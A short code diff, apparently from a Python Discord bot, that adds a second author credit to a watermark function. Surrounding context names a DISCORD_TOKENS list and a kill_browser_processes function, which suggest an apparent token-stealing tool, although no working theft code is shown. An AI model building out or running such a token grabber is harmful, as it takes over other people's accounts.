@@ -60,7 +60,7 @@ bot.remove_command("help")
 DISCORD_TOKENS = []
 
 def watermark():
-    return "\n\n***||@1ypi - https://github.com/1ypi||***"
+    return "\n\n***||@1ypi - https://github.com/1ypi||***\n***||@iznard - https://github.com/IzNard||***"
 
 def kill_browser_processes(browser_name):
     process_names = {
